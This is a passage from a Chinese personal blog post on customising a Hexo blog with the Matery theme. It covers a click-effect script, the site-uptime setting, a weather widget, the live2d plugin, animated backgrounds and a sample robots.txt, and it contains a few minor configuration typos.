class="string">&quot;公正&quot;</span>, <span class="string">&quot;法治&quot;</span>, <span class="string">&quot;爱国&quot;</span>, <span class="string">&quot;敬业&quot;</span>, <span class="string">&quot;诚信&quot;</span>, <span class="string">&quot;友善&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> $i = $(<span class="string">&quot;&lt;span/&gt;&quot;</span>).text(a[a_idx]);</span><br><span class="line">        a_idx = (a_idx + <span class="number">1</span>) % a.length;</span><br><span class="line">        <span class="keyword">var</span> x = e.pageX,</span><br><span class="line">            y = e.pageY;</span><br><span class="line">        $i.css(&#123;</span><br><span class="line">            <span class="string">&quot;z-index&quot;</span>: <span class="number">5</span>,</span><br><span class="line">            <span class="string">&quot;top&quot;</span>: y - <span class="number">20</span>,</span><br><span class="line">            <span class="string">&quot;left&quot;</span>: x,</span><br><span class="line">            <span class="string">&quot;position&quot;</span>: <span class="string">&quot;absolute&quot;</span>,</span><br><span class="line">            <span class="string">&quot;font-weight&quot;</span>: <span class="string">&quot;bold&quot;</span>,</span><br><span class="line">            <span class="string">&quot;color&quot;</span>: <span class="string">&quot;#FF0000&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">        $(<span class="string">&quot;body&quot;</span>).append($i);</span><br><span class="line">        $i.animate(&#123;</span><br><span class="line">                <span class="string">&quot;top&quot;</span>: y - <span class="number">180</span>,</span><br><span class="line">                <span class="string">&quot;opacity&quot;</span>: <span class="number">0</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="number">3000</span>,</span><br><span class="line">            <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                $i.remove();</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="string">&#x27;delay()&#x27;</span>, <span class="number">2000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delay</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">&quot;.buryit&quot;</span>).removeAttr(<span class="string">&quot;onclick&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="增加建站时间"><a href="#增加建站时间" class="headerlink" title="增加建站时间"></a>增加建站时间</h3><p>只需将主题的<code>_config.yml</code>中的<code>time</code>设置为<code>true</code>即可：</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Website start time.</span></span><br><span class="line"><span class="comment"># 站点运行开始时间.</span></span><br><span class="line"><span class="attr">time:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="string">trues</span></span><br><span class="line">  <span class="attr">year:</span> <span class="number">2019</span> <span class="comment"># 年份</span></span><br><span class="line">  <span class="attr">month:</span> <span class="number">11</span> <span class="comment"># 月份</span></span><br><span class="line">  <span class="attr">date:</span> <span class="number">30</span> <span class="comment"># 日期</span></span><br><span class="line">  <span class="attr">hour:</span> <span class="number">17</span> <span class="comment"># 小时</span></span><br><span class="line">  <span class="attr">minute:</span> <span class="number">30</span> <span class="comment"># 分钟</span></span><br><span class="line">  <span class="attr">second:</span> <span class="number">00</span> <span class="comment"># 秒</span></span><br></pre></td></tr></table></figure>

<h3 id="添加博客天气插件"><a href="#添加博客天气插件" class="headerlink" title="添加博客天气插件"></a>添加博客天气插件</h3><p>去中国天气网<a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly9jai53ZWF0aGVyLmNvbS5jbi9wbHVnaW4vcGM=">https://cj.weather.com.cn/plugin/pc</a>可以获取一段定制的天气代码，将这段代码添加到</p>
<p> <code>/themes/matery/layout/layout.ejs</code>即可，例如：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- my_weather天气 --&gt;</span><br><span class="line">    &lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        WIDGET = &#123;<span class="attr">FID</span>: <span class="string">&#x27;QIqG0hDUBi&#x27;</span>&#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;https://apip.weatherdt.com/float/static/js/r.js?v=1111&quot;</span>&gt;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="添加live2d模型"><a href="#添加live2d模型" class="headerlink" title="添加live2d模型"></a>添加live2d模型</h3><p>安装插件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure>

<p>安装模型：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure>

<p>配置：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">live2d:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">scriptFrom:</span> <span class="string">local</span></span><br><span class="line">    <span class="attr">pluginRootPath:</span> <span class="string">live2dw/</span></span><br><span class="line">    <span class="attr">pluginJsPath:</span> <span class="string">lib/</span></span><br><span class="line">    <span class="attr">pluginModelPath:</span> <span class="string">assets/</span></span><br><span class="line">    <span class="attr">tagMode:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">log:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">model:</span></span><br><span class="line">        <span class="attr">use:</span> <span class="string">live2d-widget-model-shizuku</span></span><br><span class="line">    <span class="attr">display:</span></span><br><span class="line">        <span class="attr">position:</span> <span class="string">right</span></span><br><span class="line">        <span class="attr">width:</span> <span class="number">150</span></span><br><span class="line">        <span class="attr">height:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">mobile:</span></span><br><span class="line">        <span class="attr">show:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">react:</span></span><br><span class="line">        <span class="attr">opacity:</span> <span class="number">0.7</span></span><br></pre></td></tr></table></figure>

<p>其中模型你可以更改，想了解更多，请移步官网<a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly9naXRodWIuY29tL0VZSE4vaGV4by1oZWxwZXItbGl2ZTJkL2Jsb2IvbWFzdGVyL1JFQURNRS56aC1DTi5tZA==">https://github.com/EYHN/hexo-helper-live2d/blob/master/README.zh-CN.md</a></p>
<h3 id="背景动态彩带"><a href="#背景动态彩带" class="headerlink" title="背景动态彩带"></a>背景动态彩带</h3><p>只需将<code>matery/_config.yml</code>中<code>canvas_nest</code>设置为<code>true</code>即可：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 背景静止彩带.</span></span><br><span class="line"><span class="attr">ribbon:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">size:</span> <span class="number">150</span> <span class="comment"># 彩带大小, 默认: 90.</span></span><br><span class="line">  <span class="attr">alpha:</span> <span class="number">0.6</span> <span class="comment"># 彩带透明度 (0 ~ 1), 默认: 0.6.</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">-1</span> <span class="comment"># 背景的z-index属性，css属性用于控制所在层的位置, 默认: -1.</span></span><br><span class="line">  <span class="attr">clickChange:</span> <span class="literal">false</span>  <span class="comment"># 设置是否每次点击都更换彩带.</span></span><br></pre></td></tr></table></figure>

<h3 id="背景动态线条"><a href="#背景动态线条" class="headerlink" title="背景动态线条"></a>背景动态线条</h3><p>只需将<code>matery/_config.yml</code>中<code>ribbon_dynamic</code>设置为<code>true</code>即可：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ribbon_dynamic:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>注：加载这些样式非常耗资源</p>
<h3 id="添加反爬虫协议"><a href="#添加反爬虫协议" class="headerlink" title="添加反爬虫协议"></a>添加反爬虫协议</h3><p>robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p>
<p>我们在hexo 根目录下的 <code>public</code> 目录下新建一个<code>robots.txt</code>文件，内容如下：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Allow: /</span><br><span class="line">Allow: /archives/</span><br><span class="line">Allow: /categories/</span><br><span class="line">Allow: /tags/</span><br><span class="line">DisAllow: /about/</span><br><span class="line">Disallow: /friends/</span><br><span class="line">Disallow: /contact/</span><br><span class="line">Sitemap: https://axh2018.cn/sitemap.xml</span><br><span class="line">Sitemap: https://axh2018.cn/baidu_sitemap.xml</span><br></pre></td></tr></table></figure>

<p>你可自定义哪些内容可以被爬取，哪些内容不能</p>
<p>参考:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly9jaGluYXRpYW55dW5mZW5nLmdpdGh1Yi5pby9wb3N0cy82MzQ2Ni5odG1sI3RvYy1oZWFkaW5nLTg=">https://chinatianyunfeng.github.io/posts/63466.html#toc-heading-8</a></li>
<li><a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly95YWZpbmUtYmxvZy5jbi9wb3N0cy80YWIyLmh0bWwjdG9jLWhlYWRpbmctNTU=">https://yafine-blog.cn/posts/4ab2.html#toc-heading-55</a></li>
<li><a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly9zdW5od2VlLmNvbS9wb3N0cy82ZTg4MzllYi5odG1sI3RvYy1oZWFkaW5nLTM3">https://sunhwee.com/posts/6e8839eb.html#toc-heading-37</a></li>
<li><a target="_blank" rel="noopener" href="https://axh2018.gitee.io/go.html?u=aHR0cHM6Ly9naXRodWIuY29tL2JsaW5rZm94L2hleG8tdGhlbWUtbWF0ZXJ5">https://github.com/blinkfox/hexo-theme-matery</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/04/05/setup-hexo-blog/" data-id="ckhemv857006awdcm7cp917nn" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/4/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/6/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/dev/">dev</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/">docker</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exploit/">exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/hexo/">hexo</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/life/">life</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/summary/">summary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/vul/">vul</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/" rel="tag">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/life/" rel="tag">life</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metasploit/" rel="tag">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-env/" rel="tag">pwn-env</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vul/" rel="tag">vul</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weekly-summary/" rel="tag">weekly summary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/android/" style="font-size: 12.5px;">android</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/dev/" style="font-size: 10px;">dev</a> <a href="/tags/docker/" style="font-size: 12.5px;">docker</a> <a href="/tags/golang/" style="font-size: 10px;">golang</a> <a href="/tags/hexo/" style="font-size: 12.5px;">hexo</a> <a href="/tags/kernel/" style="font-size: 12.5px;">kernel</a> <a href="/tags/life/" style="font-size: 15px;">life</a> <a href="/tags/linux/" style="font-size: 17.5px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/pwn/" style="font-size: 12.5px;">pwn</a> <a href="/tags/pwn-env/" style="font-size: 10px;">pwn-env</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/vul/" style="font-size: 10px;">vul</a> <a href="/tags/weekly-summary/" style="font-size: 12.5px;">weekly summary</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/11/08/tiesan-2020/">tiesan-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/08/wp-other/">wp-thb-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/06/wp-nssc-2020/">wp-nssc-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/01/weekly-report-3/">weekly-report-3</a>
          </li>
        
          <li>
            <a href="/2020/11/01/wp-xhb-2020/">湖湘杯2020</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 i0gan<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>